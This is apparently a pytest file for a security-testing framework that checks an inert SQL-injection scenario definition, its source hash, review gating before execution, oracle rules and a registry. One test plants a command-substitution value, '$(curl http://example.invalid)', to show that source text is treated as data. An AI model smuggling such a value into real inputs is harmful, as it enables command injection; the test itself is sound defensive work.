"""Phase 13A: the inert scenario definition, its provenance, the source-drift check and the registry."""

from __future__ import annotations

import copy
from pathlib import Path

import pytest

from tests.validation_helpers import approved_scenario
from validation.scenario import (
    REQUIRED_SOURCE_KEYS,
    SOURCE_PATH,
    SQLI_SCENARIO_ID,
    OracleRule,
    ScenarioDefinition,
    ScenarioDefinitionError,
    ScenarioRegistry,
    check_source_drift,
    default_registry,
    normalized_text_sha256,
    parse_candidate_source,
    sqli_search_scenario,
)

ROOT = Path(__file__).resolve().parents[1]
SOURCE = ROOT / SOURCE_PATH


def source_text() -> str:
    return SOURCE.read_text(encoding="utf-8")


# ------------------------------------------------------------
# the first scenario and its source
# ------------------------------------------------------------

def test_the_source_is_the_operator_metadata_file_and_not_the_answer_key():
    scenario = sqli_search_scenario()
    assert scenario.objective_source.path == SOURCE_PATH == "incident_001/metadata/attack_request.txt"
    assert "ground_truth" not in scenario.objective_source.path
    assert scenario.objective_source.ground_truth_consulted is False
    assert "answer-key" in scenario.objective_source.provenance_note
    assert not (ROOT / "incident_001" / "ground_truth" / "attack_request.txt").exists()
    assert (ROOT / SOURCE_PATH).parent.name == "metadata"


def test_the_reviewed_fields_and_hash_still_match_the_actual_source_file():
    scenario = sqli_search_scenario()
    assert check_source_drift(scenario, source_text()) == []
    assert normalized_text_sha256(source_text()) == scenario.objective_source.sha256


def test_the_hash_does_not_depend_on_line_endings():
    text = source_text()
    assert normalized_text_sha256(text.replace("\r\n", "\n")) == normalized_text_sha256(text.replace("\n", "\r\n"))


def test_a_changed_source_is_reported_as_drift_so_the_scenario_must_be_re_reviewed():
    scenario = sqli_search_scenario()
    edited = source_text().replace("/api/search", "/api/other")
    drift = check_source_drift(scenario, edited)
    assert any("pinned hash" in item for item in drift)
    assert any("'Endpoint'" in item for item in drift)


def test_a_malformed_source_is_reported_not_guessed():
    fields, problems = parse_candidate_source("Incident: incident_001\nIncident: incident_002\nbogus line\nColour: red\n")
    assert fields == {"Incident": "incident_001"}
    assert any("duplicate" in p for p in problems)
    assert any("not a 'Key: value'" in p for p in problems)
    assert any("unknown key" in p for p in problems)
    assert sum("missing key" in p for p in problems) == len(REQUIRED_SOURCE_KEYS) - 1
    _, empty_problems = parse_candidate_source("")
    assert len(empty_problems) == len(REQUIRED_SOURCE_KEYS)


def test_the_source_text_is_data_not_instructions():
    # a hostile source line is just a value; nothing is evaluated and nothing becomes a request
    hostile = source_text().replace("alter SQL predicate", "$(curl http://example.invalid); alter SQL predicate")
    fields, problems = parse_candidate_source(hostile)
    assert problems == []
    assert fields["Expected effect"].startswith("$(curl")


def test_the_first_scenario_is_not_eligible_until_a_human_approves_it_and_the_ambiguities_are_resolved():
    scenario = sqli_search_scenario()
    assert scenario.review.status == "pending_human_review" and scenario.review.reviewer is None
    assert scenario.eligible_for_execution is False
    blocking = scenario.open_blocking_ambiguities()
    assert {"oracle_not_specified_by_source", "wire_encoding_unspecified", "entry_point_is_a_candidate_only",
            "source_records_the_generated_attack"} <= set(blocking)
    assert "table_contents_unknown_at_validation_time" not in blocking  # recorded, but not blocking


def test_the_scenario_separates_objective_endpoint_probe_oracle_evidence_and_false_conclusions():
    scenario = sqli_search_scenario()
    assert scenario.objective_summary and scenario.endpoint.path == "/api/search"
    assert scenario.endpoint.method == "GET" and scenario.endpoint.parameter == "message"
    assert (scenario.endpoint.entry_service, scenario.endpoint.target_service, scenario.endpoint.data_service) == (
        "autoshield-nginx", "autoshield-api", "autoshield-postgres")
    assert scenario.probe.inert_not_executable is True and scenario.probe.wire_encoding == "unspecified"
    assert [c.condition_id for c in scenario.oracle.conditions]
    assert scenario.oracle.required_evidence and scenario.oracle.possible_false_conclusions
    assert scenario.limitations


def test_the_scenario_names_no_host_address_or_url():
    text = sqli_search_scenario().model_dump_json()
    assert "127.0.0.1" not in text and "https://" not in text
    # the only URL text is the quoted source field 'Entry point' (and its explanation), which authorizes nothing
    assert text.count("http://") == text.count("http://localhost:8080") >= 1
    assert not hasattr(sqli_search_scenario().endpoint, "host")


def test_the_oracle_never_classifies_a_failure_as_a_success():
    oracle = sqli_search_scenario().oracle
    for rule in oracle.rules:
        assert rule.status in ("objective_achieved", "objective_not_observed")
        assert "probe_response_parseable" in rule.requires_met  # a missing or unparseable probe never counts
    not_observed = next(r for r in oracle.rules if r.status == "objective_not_observed")
    assert "control_request_succeeds" in not_observed.requires_met
    assert oracle.default_when_no_rule_applies == "inconclusive"
    assert any("timeout" in item for item in oracle.possible_false_conclusions)


def test_the_scenario_definition_is_deterministic_and_hashable():
    assert sqli_search_scenario().definition_sha256() == sqli_search_scenario().definition_sha256()
    assert sqli_search_scenario().definition_sha256() != approved_scenario().definition_sha256()


# ------------------------------------------------------------
# invalid definitions
# ------------------------------------------------------------

def mutated(change) -> dict:
    data = copy.deepcopy(sqli_search_scenario().model_dump())
    change(data)
    return data


@pytest.mark.parametrize("change", [
    lambda d: d["endpoint"].update(path="api/search"),
    lambda d: d["endpoint"].update(path="/api/search?x=1"),
    lambda d: d["endpoint"].update(path="//evil"),
    lambda d: d["endpoint"].update(method="POST"),
    lambda d: d["probe"].update(inert_not_executable=False),
    lambda d: d["objective_source"].update(ground_truth_consulted=True),
    lambda d: d["objective_source"].update(sha256="abc"),
    lambda d: d["objective_source"].update(incident_id="incident_002"),
    lambda d: d.update(limitations=[]),
    lambda d: d.update(schema_version="9.9"),
    lambda d: d.update(unexpected="field"),
    lambda d: d["oracle"].update(conditions=[]),
    lambda d: d["oracle"].update(required_evidence=[]),
    lambda d: d["oracle"].update(possible_false_conclusions=[]),
    lambda d: d["oracle"]["rules"][0].update(requires_met=["no_such_condition"]),
    lambda d: d["oracle"]["rules"][0].update(requires_met=[]),
    lambda d: d["oracle"]["rules"][0].update(requires_not_met=["probe_response_parseable"]),
    lambda d: d["oracle"]["rules"][0].update(reason_code="timeout"),
    lambda d: d["ambiguities"].append(copy.deepcopy(d["ambiguities"][0])),
    lambda d: d["review"].update(status="approved"),  # approved with a blocking ambiguity and no reviewer
])
def test_invalid_scenario_definitions_are_rejected(change):
    with pytest.raises(ValueError):
        ScenarioDefinition.model_validate(mutated(change))


def test_an_approval_needs_a_named_reviewer_and_no_open_blocking_ambiguity():
    data = copy.deepcopy(sqli_search_scenario().model_dump())
    data["review"] = {"status": "approved", "reviewer": "someone", "note": "n"}
    with pytest.raises(ValueError, match="open blocking ambiguities"):
        ScenarioDefinition.model_validate(data)
    for item in data["ambiguities"]:
        item["resolved"] = True
    data["review"]["reviewer"] = None
    with pytest.raises(ValueError, match="named reviewer"):
        ScenarioDefinition.model_validate(data)
    data["review"]["reviewer"] = "someone"
    # resolving the ambiguities on paper is not enough: the wire encoding and control value must be fixed too
    with pytest.raises(ValueError, match="wire encoding and its control value"):
        ScenarioDefinition.model_validate(data)
    data["probe"]["wire_encoding"] = "percent_encoded_utf8_query"
    with pytest.raises(ValueError, match="wire encoding and its control value"):
        ScenarioDefinition.model_validate(data)
    data["probe"]["control_value"] = "zzqx-no-such-record"
    assert ScenarioDefinition.model_validate(data).eligible_for_execution is True


def test_a_rejected_review_is_never_eligible():
    data = copy.deepcopy(approved_scenario().model_dump())
    data["review"]["status"] = "rejected"
    assert ScenarioDefinition.model_validate(data).eligible_for_execution is False


def test_oracle_rule_reason_codes_belong_to_the_rule_status():
    with pytest.raises(ValueError):
        OracleRule(status="objective_achieved", reason_code="timeout", requires_met=["a"], rationale="r")


# ------------------------------------------------------------
# registry
# ------------------------------------------------------------

def test_the_default_registry_holds_only_the_one_ineligible_scenario():
    registry = default_registry()
    assert registry.ids() == [SQLI_SCENARIO_ID]
    assert registry.get(SQLI_SCENARIO_ID).eligible_for_execution is False


def test_unknown_or_non_string_scenario_ids_are_not_found():
    registry = default_registry()
    assert registry.get("no-such-scenario") is None
    for bad in (None, 5, ["x"], b"sqli"):
        assert registry.get(bad) is None


def test_the_registry_refuses_duplicates_non_definitions_and_bypassed_validation():
    registry = default_registry()
    with pytest.raises(ScenarioDefinitionError, match="duplicate"):
        registry.register(sqli_search_scenario())
    for bad in (None, {"scenario_id": "x"}, "scenario"):
        with pytest.raises(ScenarioDefinitionError, match="only a ScenarioDefinition"):
            registry.register(bad)
    invalid = ScenarioDefinition.model_construct(**{**sqli_search_scenario().__dict__, "limitations": []})
    with pytest.raises(ScenarioDefinitionError, match="invalid scenario definition"):
        ScenarioRegistry().register(invalid)


def test_a_later_scenario_can_be_added_without_touching_the_report_contract():
    data = copy.deepcopy(approved_scenario().model_dump())
    data["scenario_id"] = "second-scenario"
    registry = default_registry()
    registry.register(ScenarioDefinition.model_validate(data))
    assert registry.ids() == sorted([SQLI_SCENARIO_ID, "second-scenario"])
    # registering does not make a scenario eligible: that is the review state alone
    assert registry.get(SQLI_SCENARIO_ID).eligible_for_execution is False
    assert registry.get("second-scenario").eligible_for_execution is True
